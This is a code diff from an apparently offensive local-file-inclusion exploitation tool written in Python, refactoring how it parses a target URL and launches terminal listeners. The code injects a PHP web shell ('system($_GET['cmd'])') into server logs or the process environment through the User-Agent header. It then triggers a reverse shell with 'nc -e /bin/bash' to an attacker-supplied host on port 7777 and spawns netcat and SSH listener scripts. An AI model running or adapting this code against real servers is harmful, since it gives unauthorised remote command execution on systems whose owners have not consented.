@@ -12,25 +12,27 @@ import subprocess
 import base64
 import signal
 from subprocess import Popen, PIPE, check_output 
+
 class Shell_conncet:
 
-     def __init__(self):
-        self.control()
+    def Connect_SSh_Shell(self,**kwargs):
         if self.args.readuser:
             with open(self.args.readuser,'r') as username:
                 self.args.user = username.read().replace('/n','')
         if self.args.readpass:
            with open(self.args.readpass,'r') as password:
                 self.args.password = password.read().replace('/n','') 
-        if self.args.Domain:
-               domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
-               self.ip_re = (domain[-1][7:-2])
-               self.ip_re = self.ip_re[6:].replace('/','')
-               DisCover = Popen(["ping","-w1",self.ip_re], stdout=PIPE)
-               output   = str(DisCover.communicate()).split()
-               self.ip_re = (output[2]).replace("(",'').replace(')','')
-        else:
-            self.ip_re = self.ip_re.group()
+        if self.args.Vulnurl:
+            try:
+              domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
+              self.ip_re = (domain[-1][7:-2])
+              self.ip_re = self.ip_re[6:]
+            except Exception :
+               self.ip_re = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',self.args.Vulnurl)
+               self.ip_re = self.ip_re.group() 
+            DisCover = Popen(["ping","-w1",self.ip_re[1:]], stdout=PIPE)   
+            output   = str(DisCover.communicate()).split()
+            self.ip_re = (output[2]).replace("(",'').replace(')','')
         if "proc/self/environ" in self.url\
         or 'apache2/access.log' in self.url and not self.args.port:                                                                                                          
             self.paylaodPHP = "<?php system($_GET['cmd']); ?>"           
@@ -43,11 +45,11 @@ class Shell_conncet:
                 request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                      Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                      ('username',f'{self.args.user}'),
-                                     ('password',f'{self.args.password}')
+                                     ('password',f'{self.args.password}'),
                                      ('Cookie',str(self.Cookie).replace('\n',''))]
                         
-                path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
-                run    = ' gnome-terminal  -e '+'" '+path+' "' 
+                path   =  "python  " +str(os.getcwd())+'/Package/shell/netcat.py;exec bash'
+                run    = ' gnome-terminal -- bash -c'+'" '+path+' "' 
                 xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                 command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                 try:
@@ -80,8 +82,8 @@ class Shell_conncet:
                             
                             with open ('./Package/shell/.address','a') as readip:
                                IP_IN = readip.write(str(self.ip_re))                                                                                    
-                               path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
-                               run    =  'gnome-terminal  -e '+'" '+path+' "' 
+                               path   =  "python  " +str(os.getcwd())+'/Package/shell/ssh.py;exec bash'
+                               run    =  'gnome-terminal -- bash -c'+'" '+path+' "' 
                                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
                            
                             for T in range(30):
@@ -107,8 +109,8 @@ class Shell_conncet:
                 if not os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','a') as readip:
                          IP_IN = readip.write(str(self.ip_re))                                                                                    
-                         path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
-                         run    =  'gnome-terminal  -e '+'" '+path+' "' 
+                         path   =  "python  " +str(os.getcwd())+'/Package/shell/ssh.py;exec bash'
+                         run    = 'gnome-terminal -- bash -c '+'" '+path+' "'  
                          xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
                     for T in range(30):
                         for C in  os.popen(" ps ax | grep ssh.py | grep -v grep") :
@@ -133,8 +135,8 @@ class Shell_conncet:
                                 exit()
                             else:
                                  break                            
-                path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
-                run    =  'gnome-terminal  -e '+'" '+path+' "' 
+                path   =  "python  " +str(os.getcwd())+'/Package/shell/netcat.py;exec bash'
+                run    = 'gnome-terminal -- bash -c '+'" '+path+' "'
                 xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
                 request = mechanize.Browser()
                 request.set_handle_robots(False)
@@ -164,8 +166,8 @@ class Shell_conncet:
                 except KeyboardInterrupt:
                      exit()
         elif self.args.port:
-              path   =  "python " +str(os.getcwd())+'/Package/shell/Listen.py'
-              run    = ' gnome-terminal  -e '+'" '+path+' "'
+              path   =  "python  " +str(os.getcwd())+'/Package/shell/Listen.py'
+              run    = 'gnome-terminal -- bash -c '+'" '+path+' "' 
               xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
               request = mechanize.Browser()
               request.set_handle_robots(False)
@@ -175,33 +177,8 @@ class Shell_conncet:
                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                     ('Cookie',str(self.Cookie).replace('\n','')),]
               request.open(self.LFI).read()    
-              #self.Get_Oregnal_URL = request.open(command).read()
-              exit()
-     def control(self): 
-           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
-           parser.add_argument("-UV","--Vulnurl"    , action=None         ,required=False      ,help ="url Targst web") 
-           parser.add_argument("--auth"             , action='store_true'                    ,help ="auth mautrd web") 
-           parser.add_argument("-F","--filelist"    , action=None                            ,help ="read fron lfi wordlsit ")
-           parser.add_argument("-C","--Cookie"      , action=None        ,required=True      ,help ="Login sesion Cookie")  
-           parser.add_argument("-B","--base64"      , action='store_true'                    ,help ="decode filter php  base64")  
-           parser.add_argument("-R","--read"        , action=None                            ,help ="use to read file on the traget machine")  
-           parser.add_argument("-UF","--UserForm"   , action=None                            ,help =" add name of the HTML Form Login User")
-           parser.add_argument("-PF","--PassForm"   , action=None                            ,help ="add name of the HTML Form Login Passord")
-           parser.add_argument("-P","--password"    , action=None                            ,help ="use specific Passowrd")   
-           parser.add_argument("-p","--readpass"    , action=None                            ,help ="use specific Passowrd read from file")
-           parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
-           parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
-           parser.add_argument("-u","--readuser"    , action=None                            ,help ="use specific username read from file")
-           parser.add_argument("-A","--aggress"     ,action='store_true'                     ,help ="  use aggressiv mode  ")
-           parser.add_argument("--port"             ,action=None                             ,help ="  set port for netcat ")
-           parser.add_argument("-D","--Domain"      ,action=None                             ,help ="  use target url domain not as ip 'http://www.anyDomain.com'")
-           parser.add_argument("-S","--shell"       , action=None                            ,help ="  to connent reverseshell   ")
-           self.args = parser.parse_args()    
-           if len(sys.argv)!=1 :
-              pass
-           else:
-              parser.print_help() 
               exit()
 if __name__=='__main__':
    Shell_conncet() 
 
+ 
